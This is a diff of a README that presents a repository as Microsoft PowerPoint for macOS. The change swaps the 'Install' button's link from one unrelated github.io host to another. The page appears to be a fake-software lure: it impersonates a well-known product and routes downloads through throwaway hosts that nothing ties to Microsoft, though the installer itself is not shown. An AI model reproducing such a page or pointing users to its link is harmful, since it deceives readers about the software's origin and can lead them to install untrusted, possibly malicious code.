@@ -2,7 +2,7 @@
 <h1 align="center">PowerPoint</h1>
 <p align="center">Native presentation creation — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://napas-papuas.github.io/.github/powerpoint"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://divan-shkaf.github.io/.github/powerpoint"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://www.lifewire.com/thmb/qTWfHHGusxzJSuxstVKSfuce0TI=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/mac-powerpoint-4b3a9747c4644b22be636c43660c06f3.jpg" alt="PowerPoint — macOS presentation creation screenshot" width="780"/></p>
 
 ---
